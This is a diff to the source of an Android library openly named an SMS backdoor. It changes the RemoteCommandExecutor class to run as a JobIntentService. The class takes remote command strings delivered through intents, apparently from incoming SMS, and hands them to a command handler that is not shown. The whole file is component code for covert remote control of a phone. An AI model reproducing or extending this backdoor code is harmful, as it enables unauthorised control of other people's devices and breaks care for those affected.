@@ -15,8 +15,10 @@ limitations under the License.
 */
 package com.evilthreads.smsbackdoor
 
+import android.content.Context
 import android.content.Intent
-import com.evilthreads.wakeservicelib.WakeService
+import androidx.core.app.JobIntentService
+
 /*
             (   (                ) (             (     (
             )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
@@ -37,8 +39,12 @@ import com.evilthreads.wakeservicelib.WakeService
 ............\..............(
 ..............\.............\...
 */
-internal class RemoteCommandExecutor: WakeService("RemoteCommandExecutor"){
-    override fun Intent.doWork(){
-        getStringExtra(SmsBackdoor.KEY_REMOTE_COMMAND)?.let { command -> SmsBackdoor.commandHandler?.invoke(command) }
+internal class RemoteCommandExecutor: JobIntentService() {
+    companion object{
+        private val JOB_ID = 666
+        internal fun enqueWork(ctx: Context, intent: Intent) = enqueueWork(ctx, this::class.java, JOB_ID, intent)
+    }
+    override fun onHandleWork(intent: Intent) {
+        intent.getStringExtra(SmsBackdoor.KEY_REMOTE_COMMAND)?.let { command -> SmsBackdoor.commandHandler?.invoke(command) }
     }
 }
